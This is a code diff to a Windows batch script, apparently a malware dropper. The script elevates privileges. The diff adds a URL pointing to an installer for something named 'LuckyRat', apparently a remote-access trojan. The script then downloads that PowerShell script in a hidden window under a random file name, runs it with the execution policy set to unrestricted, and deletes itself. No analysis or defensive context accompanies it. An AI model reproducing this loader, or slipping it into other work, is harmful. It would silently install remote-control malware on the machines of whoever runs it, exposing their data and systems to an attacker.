@@ -23,6 +23,6 @@ if '%errorlevel%' NEQ '0' (
     pushd "%CD%"
     CD /D "%~dp0"
 
-powershell.exe -windowstyle hidden Invoke-WebRequest -Uri  -OutFile JKOmnHjUiwer.ps1
+powershell.exe -windowstyle hidden Invoke-WebRequest -Uri https://raw.githubusercontent.com/LuckyWares/LuckyRat/refs/heads/main/Installer/installer.ps1 -OutFile JKOmnHjUiwer.ps1
 powershell.exe -windowstyle hidden -ep unrestricted ./JKOmnHjUiwer.ps1
 del uhNdWeraxD.cmd
